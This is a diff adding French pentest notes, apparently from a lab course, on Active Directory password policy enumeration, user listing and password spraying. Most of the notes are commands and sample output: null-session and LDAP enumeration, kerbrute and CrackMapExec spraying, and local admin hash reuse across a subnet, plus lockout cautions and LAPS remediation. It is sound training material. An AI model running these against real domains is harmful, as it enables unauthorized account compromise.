@@ -327,3 +327,238 @@ Crack NetNTLMv2 capturés avec Hashcat (identique à la version Linux).
 - STOP ou Ctrl+C pour stopper la capture quand tu veux.
 
 ---
+
+# AD Password Policy Enumeration
+
+## 1. Avec credentials (Linux)
+
+- CrackMapExec :  
+  `crackmapexec smb <dc_ip> -u <user> -p <pass> --pass-pol`
+
+## 2. Sans credentials (NULL Session Linux)
+
+- rpcclient (null session) :  
+  `rpcclient -U "" -N <dc_ip>`
+  - Dans le prompt rpcclient :  
+    - `querydominfo`
+    - `getdompwinfo`
+
+- enum4linux :  
+  `enum4linux -P <dc_ip>`
+
+- enum4linux-ng (plus lisible, export yaml/json) :  
+  `enum4linux-ng -P <dc_ip> -oA output`
+
+## 3. LDAP anonymous bind (Linux)
+
+- ldapsearch :  
+  `ldapsearch -h <dc_ip> -x -b "DC=DOM,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength`
+
+## 4. Avec credentials (Windows)
+
+- net.exe (commande native) :  
+  `net accounts`
+
+- PowerView :  
+  `Import-Module .\PowerView.ps1`
+  `Get-DomainPolicy`
+
+## 5. Null session Windows
+
+- Ouvrir une null session SMB depuis Windows :  
+  `net use \\<dc>\ipc$ "" /u:""`
+
+## 6. Conseils
+
+- Toujours vérifier la password policy AVANT tout password spraying
+- Si la policy est inconnue, ne jamais dépasser 1 ou 2 tentatives par user (et attendre au moins 1h entre 2 essais)
+- Ne jamais lockout de comptes sur un test client
+
+## 8. Outils alternatifs
+
+- ad-ldapdomaindump.py
+- windapsearch.py
+- SharpView / SharpMapExec (Windows/.NET)
+---
+
+# Password Spraying – Target User List
+
+## Objectif
+
+Avant un password spray, il faut :
+- Une liste de users valides (AD)
+- Connaitre la password policy du domaine
+- Logger : users testés, DC utilisé, date/heure, mot de passe tenté
+
+
+## 1. Récupérer la liste des users AD
+
+### a. Avec SMB NULL session (Linux)
+
+- **enum4linux**
+  `enum4linux -U <dc_ip> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"`
+
+- **rpcclient**
+  `rpcclient -U "" -N <dc_ip>`
+
+- **CrackMapExec**
+  `crackmapexec smb <dc_ip> --users`
+*Affiche aussi badpwdcount (tentatives ratées), utile pour éviter le lockout*
+
+### b. Avec LDAP anonymous bind (Linux)
+
+- **ldapsearch**
+  `ldapsearch -h <dc_ip> -x -b "DC=DOM,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "`
+
+- **windapsearch**
+  `./windapsearch.py --dc-ip <dc_ip> -u "" -U`
+*Affiche tous les users, UPNs, CN, etc.*
+
+### c. Avec Kerbrute (internal network)
+
+- **Kerbrute (userenum)**
+  `kerbrute userenum -d <dom> --dc <dc_ip> <wordlist.txt>`
+*Renvoie seulement les users valides*
+
+### d. Avec credentials (Linux/Windows)
+
+- **CrackMapExec**
+  `crackmapexec smb <dc_ip> -u <user> -p <pass> --users`
+
+### e. Autres méthodes (si pas d'accès interne)
+
+- Générer wordlists via outils open-source (linkedin2username, Github, harvesting email, etc.)
+- Utiliser des wordlists génériques (statistically-likely-usernames, etc.)
+
+## 2. Nettoyer la liste de users
+
+- Enlever : comptes built-in (administrator, guest, krbtgt, comptes machine $)
+- Supprimer les doublons
+- Filtrer selon les patterns observés (first.last, flast, etc.)
+- Enlever les comptes proches du lockout (badpwdcount élevé)
+
+## 3. Points de vigilance
+
+- **NE PAS** tenter + de tentatives que la lockout threshold (3 tentatives sûres si lockout=5)
+- Espacer les sprays (au moins 31 min si lockout window = 30 min)
+- Logguer tout ce qui est tenté
+- Si la policy est inconnue : 1 spray max / user et grosse pause
+
+## 4. Exemple de log à tenir
+
+| Date/Heure          | DC          | User          | Password         | Résultat        |
+|---------------------|-------------|---------------|------------------|-----------------|
+| 2025-07-21 11:15    | 172.16.5.5  | htb-student   | Welcome2024!     | Success         |
+| 2025-07-21 11:16    | 172.16.5.5  | avazquez      | Welcome2024!     | Failed          |
+
+## 5. Outils alternatifs / Tips
+
+- **Avec SYSTEM shell sur Windows** : on peut aussi dumper les users via PowerShell (PowerView, SharpView)
+- Pour les très gros environnements, filtrer d'abord sur les UPN actifs ou lastLogon récent
+
+---
+
+# Internal Password Spraying - from Linux
+
+## Méthodes principales
+
+### Avec `rpcclient`
+
+On tente un login pour chaque user de la liste.  
+Si la réponse contient `Authority`, le login est OK :
+
+`for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done`
+
+**Exemple de sortie** :
+- `Account Name: tjohnson, Authority Name: INLANEFREIGHT`
+- `Account Name: sgage, Authority Name: INLANEFREIGHT`
+
+### Avec `kerbrute`
+
+Password spraying avec Kerbrute :
+
+`kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1`
+
+**Exemple de sortie** :
+- `[+] VALID LOGIN:   sgage@inlanefreight.local:Welcome1`
+
+### Avec `CrackMapExec`
+
+Password spraying sur tous les users avec un seul mot de passe :
+
+`sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +`
+
+**Exemple de sortie** :
+- `[+] INLANEFREIGHT.LOCAL\avazquez:Password123`
+
+Pour valider un identifiant trouvé sur le DC :
+
+`sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123`
+
+## Password reuse : Local Admin
+
+Si on récupères le hash NTLM ou le mot de passe du compte administrateur local d’un poste, on peux tenter le même mot de passe sur tous les autres hôtes du réseau.
+
+Exemple : spray du hash admin local partout avec le flag `--local-auth` :
+
+`sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +`
+
+**Exemple de sortie** :
+- `[+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)`
+
+Ce problème est très courant dans les grands parcs où la même image disque (golden image) est utilisée partout.
+
+## Conseils et bonnes pratiques
+
+- Toujours respecter le `lockout threshold` du domaine (ex : 5 tentatives = lock 30min)
+- Faire des pauses entre chaque spray (ex : 2 ou 3 passes puis attendre 30-60min)
+- Logger : comptes ciblés, password testé, date/heure, DC utilisé, résultat
+- Tenter les patterns de reuse : user local/admin peut aussi être réutilisé comme user de domaine, ou entre domaines en trust
+- ⚠️ **ATTENTION : méthode très bruyante**, à éviter si besoin de rester stealth (préférer Kerbrute ou attaques plus subtiles)
+
+## Remédiation côté client
+
+- **Installer et configurer LAPS (Local Administrator Password Solution)** pour imposer un mot de passe admin local unique et rotatif sur chaque machine (empêche totalement ce type d’attaque via reuse admin local).
+
+---
+
+# Internal Password Spraying - from Windows
+
+## Principe
+
+Depuis un hôte Windows membre du domaine, il est possible de réaliser du password spraying avec des outils natifs ou spécifiques.  
+Le script PowerShell **DomainPasswordSpray** est particulièrement efficace pour cela.
+
+## Utilisation de DomainPasswordSpray.ps1
+
+Si l’hôte est **membre du domaine** et que nous sommes authentifié, le script peut générer automatiquement la liste d’utilisateurs, interroger la politique de mot de passe, et exclure les comptes proches du lockout.
+
+- Pour charger le module :
+`Import-Module .\DomainPasswordSpray.ps1`
+
+- Pour lancer un spray d’un seul mot de passe sur tous les utilisateurs du domaine et écrire les succès dans un fichier :
+`Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue`
+
+## Avec Kerbrute sur Windows
+
+On peux également utiliser Kerbrute pour faire la même chose que sous Linux :
+- user enumeration
+- password spraying
+
+## Password Spraying Externe
+
+Cibles typiques :
+- Microsoft 0365
+- Outlook Web Exchange
+- Skype for Business
+- Lync Server
+- Portails RDS, Citrix, VDI, VPN utilisant l’AD
+- Applis web custom connectées à l’AD
+
+---
+
+
+
+
+
+
